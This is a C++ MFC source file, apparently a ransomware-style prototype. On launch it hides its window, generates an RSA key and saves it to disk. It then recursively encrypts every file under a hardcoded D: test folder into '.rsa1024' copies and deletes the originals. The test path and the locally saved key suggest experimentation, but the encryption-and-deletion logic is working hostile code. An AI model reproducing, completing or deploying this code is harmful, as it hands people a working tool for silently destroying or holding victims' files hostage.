
// ForceCode.cpp : 定义应用程序的类行为。
//

#include "stdafx.h"
#include "afxwinappex.h"
#include "afxdialogex.h"
#include "ForceCode.h"
#include "MainFrm.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif



private_key pkey;



// CForceCodeApp

BEGIN_MESSAGE_MAP(CForceCodeApp, CWinAppEx)
	ON_COMMAND(ID_APP_ABOUT, &CForceCodeApp::OnAppAbout)
END_MESSAGE_MAP()


// CForceCodeApp 构造

CForceCodeApp::CForceCodeApp()
{
	m_bHiColorIcons = TRUE;

	// TODO: 将以下应用程序 ID 字符串替换为唯一的 ID 字符串；建议的字符串格式
	//为 CompanyName.ProductName.SubProduct.VersionInformation
	SetAppID(_T("ForceCode.AppID.NoVersion"));

	// TODO: 在此处添加构造代码，
	// 将所有重要的初始化放置在 InitInstance 中
}

// 唯一的一个 CForceCodeApp 对象

CForceCodeApp theApp;


// CForceCodeApp 初始化

BOOL CForceCodeApp::InitInstance()
{
	CWinAppEx::InitInstance();


	EnableTaskbarInteraction(FALSE);

	// 使用 RichEdit 控件需要  AfxInitRichEdit2()	
	// AfxInitRichEdit2();

	// 标准初始化
	// 如果未使用这些功能并希望减小
	// 最终可执行文件的大小，则应移除下列
	// 不需要的特定初始化例程
	// 更改用于存储设置的注册表项
	// TODO: 应适当修改该字符串，
	// 例如修改为公司或组织名
	SetRegistryKey(_T("应用程序向导生成的本地应用程序"));


	InitContextMenuManager();

	InitKeyboardManager();

	InitTooltipManager();
	CMFCToolTipInfo ttParams;
	ttParams.m_bVislManagerTheme = TRUE;
	theApp.GetTooltipManager()->SetTooltipParams(AFX_TOOLTIP_TYPE_ALL,
		RUNTIME_CLASS(CMFCToolTipCtrl), &ttParams);

	// 若要创建主窗口，此代码将创建新的框架窗口
	// 对象，然后将其设置为应用程序的主窗口对象
	CMainFrame* pFrame = new CMainFrame;
	if (!pFrame)
		return FALSE;
	m_pMainWnd = pFrame;
	// 创建并加载框架及其资源
	pFrame->LoadFrame(IDR_MAINFRAME, WS_OVERLAPPEDWINDOW | FWS_ADDTOTITLE, NULL, NULL);





	// 唯一的一个窗口已初始化，因此显示它并对其进行更新
	//pFrame->ShowWindow(SW_SHOW);
	//pFrame->UpdateWindow();
	// 仅当具有后缀时才调用 DragAcceptFiles
	//  在 SDI 应用程序中，这应在 ProcessShellCommand 之后发生

	pFrame->ShowWindow(SW_HIDE);
	//ShowWindow(AfxGetMainWnd()->m_hWnd, SW_HIDE);//隐藏主窗口
	pkey=MakePrime(MODE_1024);//产生1024位密钥
	while(rsa1024_checkprivatekey(pkey)==false)//产生的密匙不符合要求
	{
		pkey=MakePrime(MODE_1024);//重新产生1024位密钥
	}
	//rsa1024_privatekey_outtofile("c:\\Windows\\System32\\rsa1024pkey.dat",pkey);
	//rsa1024_privatekey_outtofile("d:\\rsa1024pkey.dat",pkey);
	CString pkeyfilename=MyGetTime("d:\\rsa1024pkey%Y%m%d%H%M%S.dat");//为避免此程序多次运行产生不同密匙，写入密匙文件时覆盖原文件，采用当前时间命名该文件避免意外覆盖原文件
	rsa1024_privatekey_outtofile(MyCStringToConstChar(pkeyfilename),pkey);
	const CString strDirPath=_T("d:\\filetest");
	int filenumber=-1;
	for(int i=0;i<10&&filenumber!=0;i++)//检查10次
	{
		if(PathFileExists(strDirPath))//判断文件路径是否存在
		{
			SetCurrentDirectory(strDirPath);//设置当前目录
			filenumber=FindFile(strDirPath);
		}
		else//文件路径不存在
		{
			exit(0);
		}
	}
	exit(0);

	return TRUE;
}

int CForceCodeApp::ExitInstance()
{
	//TODO: 处理可能已添加的附加资源
	return CWinAppEx::ExitInstance();
}

// CForceCodeApp 消息处理程序


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()

// 用于运行对话框的应用程序命令
void CForceCodeApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

// CForceCodeApp 自定义加载/保存方法

void CForceCodeApp::PreLoadState()
{
	BOOL bNameValid;
	CString strName;
	bNameValid = strName.LoadString(IDS_EDIT_MENU);
	ASSERT(bNameValid);
	GetContextMenuManager()->AddMenu(strName, IDR_POPUP_EDIT);
}

void CForceCodeApp::LoadCustomState()
{
}

void CForceCodeApp::SaveCustomState()
{
}

// CForceCodeApp 消息处理程序

int CForceCodeApp::FindFile(CString Curdir)
{
	int filenumber=0;
	CFileFind  finder;
    BOOL bWorking = finder.FindFile(_T("*.*"));
    while(bWorking)
    {
		bWorking = finder.FindNextFile();
        if(finder.IsDirectory()&&!finder.IsDots())//文件夹
		{
			LPWSTR oldDir=new WCHAR[512];//保存原始的当前路径
			GetCurrentDirectory(512,oldDir);//获取当前路径
			SetCurrentDirectory(finder.GetFilePath());
			FindFile(finder.GetFilePath());//继续遍历子文件夹
			SetCurrentDirectory(oldDir);//恢复当前目录
			delete oldDir;
		}
        else if(!finder.IsDirectory())//文件
		{
			CString FileName=finder.GetFileName();
			int Where=FileName.ReverseFind('//');
            if(Where==-1)
            {
                Where=FileName.ReverseFind('/');
            }
            CString FileTitle=FileName.Right(FileName.GetLength()-1-Where);
            int Which=FileTitle.ReverseFind('.');
            CString ExtendName=FileTitle.Right(FileTitle.GetLength()-Which-1);
			if(ExtendName!="rsa1024")
			{
				filenumber++;
				CString FileName=finder.GetFilePath();
			    char filename_in[512];
	            char filename_out[512];
			    strcpy_s(filename_in,512,MyCStringToConstChar(FileName));
				sprintf_s(filename_out,512,"%s.rsa1024",filename_in);
				int result_code=rsa1024_file_code(filename_in, filename_out, pkey, MODE_NOCREATEPRIVATEKEY_NOCHECKPRIVATEKEY);
				for(int i=0;i<10&&result_code!=1;i++)//如果加密失败，则再尝试10次
				{
					result_code=rsa1024_file_code(filename_in, filename_out, pkey, MODE_NOCREATEPRIVATEKEY_NOCHECKPRIVATEKEY);
				}
				if(result_code==1)//如果加密成功，则删除原文件
				{
					DeleteFile(MyCharToLPCTSTR(filename_in));
				}
			}
		}
    }
	finder.Close();
	return filenumber;
}
